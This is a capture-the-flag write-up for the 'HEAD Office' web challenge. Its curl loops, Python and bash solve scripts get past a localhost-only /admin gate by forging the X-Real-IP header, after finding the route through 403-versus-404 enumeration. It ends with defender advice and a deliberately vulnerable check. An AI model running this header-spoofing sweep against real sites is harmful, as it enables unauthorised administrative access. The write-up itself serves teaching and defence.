# HEAD Office — CTF Writeup

**Category:** Web (Broken Access Control — IP Allow-list Trusting a Client-Supplied Header)
**Points:** 250
**Target:** `http://54.72.82.22:8180`
**Flag:** `safctf{e657eef1b0b097c60911f62cfe4ec61b}`

---

## 1. Challenge Description

> **HEAD Office** — 250 pts
> *The building never really sleeps. Behind the reception desks and ordinary meeting rooms, there
> are places most people never need to visit. Everything has its department. Everything has its
> process.*
> *But some doors were never meant to be on the floor plan.*
> Connect to the challenge web service: `http://54.72.82.22:8180`

**Hint interpretation:**

| Phrase | Meaning |
| --- | --- |
| "**HEAD** Office" | Double meaning — the admin *head office*, and **HTTP headers**. The vuln is a header trust issue. |
| "some **doors were never meant to be on the floor plan**" | An **undocumented route** (`/admin`) that exists but isn't linked for normal users. |
| "Everything has its **department**… its **process**" | Corporate theming; the app separates "reception" (public) from "head office" (restricted). |
| "most people never need to visit" | The restricted area is gated by an **IP allow-list** — for "localhost only". |

The landing page is themed **VINYL VAULT / Record store** — *"Deep cuts and rare pressings. Search
the collection behind the counter."*

---

## 2. Recon

### 2.1 Fingerprint

```bash
curl -s -i http://54.72.82.22:8180/
```

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.11.16
Content-Type: text/html; charset=utf-8
Content-Length: 5909
```

**Werkzeug / Flask on Python 3.11.** The page contains a client-side login form:

```html
<h2>Login</h2>
<form id="login-form">
    Username: <input name="username" id="username"><br>
    Access Level:
    <select name="access_level" id="access_level">
        <option value="user">User</option>
    </select><br>
    <button type="submit">Login</button>
</form>
<div id="response"></div>
```

### 2.2 Read the inline JavaScript — it plants a **decoy header**

```javascript
document.getElementById("login-form").addEventListener("submit", async function(e) {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const accessLevel = document.getElementById("access_level").value;

    const res = await fetch("/", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Forwarded-For": "8.8.8.8"          // <-- deliberate distraction
        },
        body: `username=${encodeURIComponent(username)}&access_level=${encodeURIComponent(accessLevel)}`
    });

    const html = await res.text();
    document.body.innerHTML = html;
});
```

Two things to note:

1. The page **hardcodes an `X-Forwarded-For` header** into every request. This is bait: it tells the
   attacker "IP addresses matter here" while naming the **wrong** header.
2. `access_level` is a **client-controlled form field** that the server echoes back — a broken-access-control
   smell, but the actual `select` only offers `"user"`.

### 2.3 Route enumeration — a door not on the floor plan

```bash
for p in / /api /flag /admin /login /search /collection /records /vault /secret /floorplan; do
  printf "%-14s %s\n" "$p" "$(curl -s -o /dev/null -w '%{http_code}' -m 8 "http://54.72.82.22:8180$p")"
done
```

```
/             200
/api          404
/flag         404
/admin        403     <-- EXISTS but FORBIDDEN (404 = missing, 403 = present & gated)
/login        404
/search       404
...
```

**`403` instead of `404` is the tell.** `/admin` is a real route that is refusing us. That is the
"door never meant to be on the floor plan".

Its body explains the gate:

```bash
curl -s http://54.72.82.22:8180/admin
```

```
Access denied: Admins only....try harder!
```

### 2.4 Logging in

```bash
curl -s -X POST http://54.72.82.22:8180/ -d "username=alice&access_level=user"
```

```html
<h2>Hello, alice</h2>
<p>Access level: user</p>
<p><a href="/admin">Open the listening room</a></p>
```

So a normal user is *shown* the link to `/admin` … and then blocked by a 403. The gate has nothing to
do with the login at all — which is the clue that it is an **IP-based** check.

---

## 3. Step 1 — Find the Header the Server Actually Trusts

The JS advertises `X-Forwarded-For`. Test it — and then test the whole family of IP-forwarding
headers, because applications frequently check one while a proxy sets another:

```bash
for h in "X-Forwarded-For: 127.0.0.1" \
         "X-Real-IP: 127.0.0.1" \
         "X-Originating-IP: 127.0.0.1" \
         "X-Remote-Addr: 127.0.0.1" \
         "Client-IP: 127.0.0.1" \
         "X-Client-IP: 127.0.0.1" \
         "X-Forwarded-Host: 127.0.0.1" \
         "Forwarded: for=127.0.0.1"; do
  printf "%-34s %s\n" "$h" \
    "$(curl -s -o /dev/null -w '%{http_code}' -m 8 -H "$h" http://54.72.82.22:8180/admin)"
done
```

| Header sent | `/admin` |
| --- | --- |
| *(none)* | 403 |
| `X-Forwarded-For: 127.0.0.1` | 403 ← the decoy |
| `X-Forwarded-Host: 127.0.0.1` | 403 |
| `X-Originating-IP: 127.0.0.1` | 403 |
| `X-Remote-Addr: 127.0.0.1` | 403 |
| `Client-IP: 127.0.0.1` | 403 |
| `X-Client-IP: 127.0.0.1` | 403 |
| `Forwarded: for=127.0.0.1` | 403 |
| **`X-Real-IP: 127.0.0.1`** | **200** ✅ |

**The server trusts `X-Real-IP`, not `X-Forwarded-For`.** The JavaScript's hardcoded
`X-Forwarded-For: 8.8.8.8` was pure misdirection.

### 3.1 The check is an exact string comparison

```bash
for ip in 127.0.0.1 127.0.0.2 127.1.1.1 localhost ::1 0.0.0.0 10.0.0.1 "127.0.0.1 "; do
  printf "%-12s %s\n" "'$ip'" \
    "$(curl -s -o /dev/null -w '%{http_code}' -m 8 -H "X-Real-IP: $ip" http://54.72.82.22:8180/admin)"
done
```

```
'127.0.0.1'     200      <-- exact match only
'127.0.0.2'     403
'127.1.1.1'     403
'localhost'     403
'::1'           403
'0.0.0.0'       403
'10.0.0.1'      403
'127.0.0.1 '    403      <-- even a trailing space fails
```

This is a naive `request.headers.get("X-Real-IP") == "127.0.0.1"` — a **plain string equality
check**, not a parsed/validated IP comparison. It is trivially forged by the client.

---

## 4. Step 2 — Walk Through the Door

```bash
curl -s -H "X-Real-IP: 127.0.0.1" http://54.72.82.22:8180/admin
```

```html
<h3>Welcome to the listening room!</h3><p>Flag: safctf{e657eef1b0b097c60911f62cfe4ec61b}</p>
```

### ✅ Flag

```
safctf{e657eef1b0b097c60911f62cfe4ec61b}
```

**One-liner:**

```bash
curl -s -H "X-Real-IP: 127.0.0.1" http://54.72.82.22:8180/admin | grep -oE 'safctf\{[^}]+\}'
```

> **Side note on the "HEAD" name:** the `HEAD` method is also a head-*er* pun. Sending `HEAD /admin`
> with no header still returns **403** — so the HTTP verb is not the bypass; the **header** is. It's
> the `X-Real-IP` **head**er + the **head** office.

---

## 5. Kill Chain Summary

```
http://54.72.82.22:8180/        VINYL VAULT login (username + access_level)
        │  the page's JS hardcodes  X-Forwarded-For: 8.8.8.8   ← DECOY
        ▼
route enum:  /admin  → 403  (404 elsewhere)  → a real, gated door
        │  body: "Access denied: Admins only....try harder!"
        ▼
header sweep on /admin:
     X-Forwarded-For / X-Originating-IP / Client-IP / Forwarded / …  → 403
     X-Real-IP: 127.0.0.1                                           → 200
        │  (exact string match; 127.0.0.2 / localhost / ::1 all fail)
        ▼
GET /admin  (Header: X-Real-IP: 127.0.0.1)
        ▼
<safctf{e657eef1b0b097c60911f62cfe4ec61b}>
```

---

## 6. Full Solve Script

```python
#!/usr/bin/env python3
# HEAD Office — full solve
import re, urllib.request

B = "http://54.72.82.22:8180"

# 1. discover the gated route (403 != 404)
for path in ("/admin", "/administrator", "/backoffice", "/hq"):
    req = urllib.request.Request(B + path)
    try:
        code = urllib.request.urlopen(req).status
    except urllib.error.HTTPError as e:
        code = e.code
    print(f"[*] {path:<16} -> {code}")
    if code in (401, 403):
        target = path

# 2. sweep the IP-forwarding headers until one is trusted
CANDIDATES = [
    "X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Remote-Addr",
    "X-Client-IP", "Client-IP", "X-Forwarded-Host", "X-Remote-IP",
]
for header in CANDIDATES:
    req = urllib.request.Request(B + target)
    req.add_header(header, "127.0.0.1")
    try:
        body = urllib.request.urlopen(req).read().decode()
        print(f"[*] {header:<22} -> 200")
        m = re.search(r"safctf\{[^}]+\}", body)
        if m:
            print("\n[+] TRUSTED HEADER:", header)
            print("[+] FLAG:", m.group(0))
            break
    except urllib.error.HTTPError as e:
        print(f"[*] {header:<22} -> {e.code}")
```

**Bash:**

```bash
#!/usr/bin/env bash
# HEAD Office — full solve
set -euo pipefail
B="http://54.72.82.22:8180"

# 1. spot the gated door
curl -s -o /dev/null -w "/admin -> %{http_code}\n" "$B/admin"

# 2. spoof the trusted header
curl -s -H "X-Real-IP: 127.0.0.1" "$B/admin" | grep -oE 'safctf\{[^}]+\}'
```

---

## 7. Tools & Techniques

| Tool | Purpose |
| --- | --- |
| `curl -i` | Reading status codes and headers |
| `curl -w '%{http_code}'` loops | Distinguishing **403** (exists, gated) from **404** (missing) |
| Reading inline `<script>` | Finding the planted `X-Forwarded-For` decoy |
| **Header-family sweep** | Testing `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`, `Client-IP`, `Forwarded`, … |
| Boundary testing on the IP value | Proving the check is an exact string compare (`127.0.0.2`, `localhost`, `::1` all fail) |
| HexStrike MCP / BlackBook MCP | Offensive orchestration + technique grounding |

### Techniques

1. **Status-code oracle for route discovery** — a `403` on a path means the route *exists*; a `404`
   means it does not. This is how the undocumented admin door was found.
2. **Source/JS review for red herrings** — the client JS advertised `X-Forwarded-For`, which turned
   out to be a decoy.
3. **HTTP header trust confusion** — the app read one IP header; the client (and any attacker) can
   supply *any* of them.
4. **IP allow-list bypass via header spoofing** — `X-Real-IP: 127.0.0.1` impersonates localhost.
5. **Exact-match fingerprinting** — probing adjacent values (`127.0.0.2`, trailing whitespace)
   established that the comparison was a raw string equality, confirming the forgery would always
   work.
6. **Broken access control via client-controlled `access_level`** — observed in the login POST; a
   secondary smell even though it wasn't the gate here.

---

## 8. Defender Takeaways

- **Never make a security decision from a client-supplied header.** `X-Real-IP`, `X-Forwarded-For`,
  `X-Originating-IP`, `Client-IP`, `Forwarded`, `X-Forwarded-Host` and friends are **attacker-controlled
  input** unless a trusted reverse proxy *overwrites* them on every request. Treating them as
  identity is equivalent to letting anyone claim any IP.

  ```python
  # VULNERABLE
  if request.headers.get("X-Real-IP") == "127.0.0.1":
      return admin_panel()          # forge the header → full admin access
  ```

- **Gate on the real transport peer, and strip inbound spoofing headers at the edge.** Prefer the
  actual socket address and have your proxy **delete** any client-supplied forwarding headers before
  adding its own:

  ```nginx
  proxy_set_header X-Real-IP        $remote_addr;   # overwrite, never append
  proxy_set_header X-Forwarded-For  $proxy_add_x_forwarded_for;
  ```
  …and have the application trust only the *proxy-set* value, or better, put the admin area on a
  separate network/port or behind real authentication.

- **Don't rely on network location as an authorisation control for a web route.** "Localhost only"
  is not a security boundary when the HTTP layer is reachable and headers are forgeable. Require
  proper authentication/authorisation (session or token) for `/admin`.

- **Compare IPs as parsed addresses, not strings.** Even a legitimate allow-list should use
  `ipaddress.ip_address()` comparisons — `==` on strings invites bypasses via alternate notations
  (`2130706433`, `0177.0.0.1`, `[::ffff:127.0.0.1]`) or trailing whitespace. (Here it *failed*, but
  only because the check was strictly literal — the design is still wrong.)

- **Return `404` for unauthorised routes if you want to hide them.** The `403` vs `404` difference
  is a free enumeration oracle that hands attackers your internal surface:
  *"Access denied: Admins only....try harder!"* is a signpost.

- **Don't let the client tell you its privilege level.** `access_level` arrived in the POST body and
  was echoed straight back — always derive authorisation server-side from the authenticated
  identity, never from a request parameter.
